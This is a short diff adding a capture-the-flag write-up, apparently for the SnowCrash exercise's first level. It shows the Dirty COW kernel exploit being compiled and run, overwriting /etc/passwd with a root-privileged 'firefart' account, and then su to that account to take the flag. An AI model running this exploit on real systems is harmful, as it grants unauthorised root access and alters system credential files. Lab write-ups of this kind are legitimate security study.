@@ -1,0 +1,20 @@
+# LEVEL 00
+
+## dirty cow
+
+https://www.exploit-db.com/exploits/40839
+
+level00@SnowCrash:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
+level00@SnowCrash:/tmp$ ./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password:
+Complete line:
+firefart:fi9qqr4F6Msv.:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+
+^C
+level00@SnowCrash:/tmp$ su firefart
+Password:
+firefart@SnowCrash:/tmp# getflag
+Check flag.Here is your token : You are root are you that dumb ?
